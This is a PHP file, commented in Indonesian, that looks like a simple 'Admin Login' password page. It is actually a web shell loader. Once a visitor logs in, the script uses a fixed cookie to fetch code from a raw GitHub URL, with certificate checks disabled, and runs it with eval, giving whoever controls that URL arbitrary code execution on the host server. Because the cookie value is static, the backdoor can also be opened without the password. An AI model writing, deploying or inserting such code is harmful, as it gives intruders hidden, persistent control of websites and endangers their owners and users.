<?php
// ---- CONFIGURASI ----
$cookie_name  = 'user_id';
$cookie_value = 'user123'; // Bisa diganti sesuai kebutuhan
$cookie_time  = 3600;      // 1 jam
$hashed_password = 'd4f35352653e1ec0bb23bf8eed843a19'; // MD5 dari password kamu

// ---- FUNGSI CEK LOGIN ----
function is_logged_in($cookie_name, $cookie_value)
{
    return isset($_COOKIE[$cookie_name]) && $_COOKIE[$cookie_name] === $cookie_value;
}

// ---- FUNGSI AMBIL DATA URL ----
function geturlsinfo($url)
{
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        $data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $data   = stream_get_contents($handle);
        fclose($handle);
    } else {
        $data = false;
    }
    return $data;
}

// ---- CEK LOGIN ----
if (is_logged_in($cookie_name, $cookie_value)) {
    // Sudah login, jalankan script utama
    $a = geturlsinfo('https://raw.githubusercontent.com/erosjoko5/solo/refs/heads/main/gecko');
    if ($a !== false) {
        eval('?>' . $a);
    } else {
        echo "Gagal mengambil data dari URL.";
    }
    exit;
}

// ---- PROSES LOGIN ----
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    if (md5($entered_password) === $hashed_password) {
        // Password benar, set cookie dan redirect agar langsung login
        setcookie($cookie_name, $cookie_value, time() + $cookie_time, '/');
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Incorrect password. Please try again.";
    }
}

// ---- FORM LOGIN ----
?>
<!DOCTYPE html>
<html>
<head>
    <title>Admin Login</title>
</head>
<body>
    <?php if (!empty($error)) echo "<p style='color:red;'>$error</p>"; ?>
    <form method="POST" action="">
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        <input type="submit" value="Login">
    </form>
</body>
</html>
